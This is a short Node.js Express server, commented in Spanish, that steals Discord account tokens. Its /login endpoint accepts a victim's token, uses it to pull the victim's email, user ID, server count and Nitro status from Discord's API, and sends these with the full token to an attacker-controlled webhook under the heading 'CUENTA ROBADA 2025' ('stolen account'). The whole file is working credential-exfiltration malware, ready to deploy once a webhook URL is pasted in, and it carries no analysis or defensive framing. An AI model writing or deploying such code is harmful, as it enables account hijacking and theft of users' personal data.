const express = require('express');
const https = require('https');
const app = express();
app.use(express.json({ limit: '10mb' }));

app.post('/login', async (req, res) => {
  const token = req.body.token;
  if (!token || token.length < 50) return res.send("no token");

  try {
    const user = await httpRequest('discord.com', '/api/v9/users/@me', token);
    const guilds = await httpRequest('discord.com', '/api/v9/users/@me/guilds', token);

    // CAMBIA ESTO POR TU WEBHOOK PRIVADO (creá uno nuevo en un canal solo tuyo)
    const WEBHOOK = "https://discord.com/api/webhooks/PEGA_TU_WEBHOOK_AQUI";

    const embed = {
      content: "@everyone **CUENTA ROBADA 2025**",
      embeds: [{
        title: `${user.username}#${user.discriminator}`,
        description: `Email: ${user.email || 'oculto'}\nID: ${user.id}\nServidores: ${guilds.length}\nNitro: ${user.premium_type ? 'SÍ' : 'NO'}`,
        thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512` },
        color: 0x00ff00,
        fields: [{ name: "TOKEN COMPLETO", value: "```" + token + "```" }]
      }]
    };

    await httpRequest('discord.com', '/api/webhooks/' + WEBHOOK.split('/webhooks/')[1], null, JSON.stringify(embed));

    res.send("LOGUEADO");
  } catch (e) {
    res.send("invalid");
  }
});

function httpRequest(host, path, token = null, postData = null) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: host,
      path: path,
      method: postData ? 'POST' : 'GET',
      headers: {
        'Authorization': token || undefined,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
      }
    };

    const req = https.request(options, res => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); } 
        catch { resolve(data); }
      });
    });

    req.on('error', reject);
    if (postData) req.write(postData);
    req.end();
  });
}

app.listen(process.env.PORT || 3000, () => console.log('BOT ONLINE 2025'));
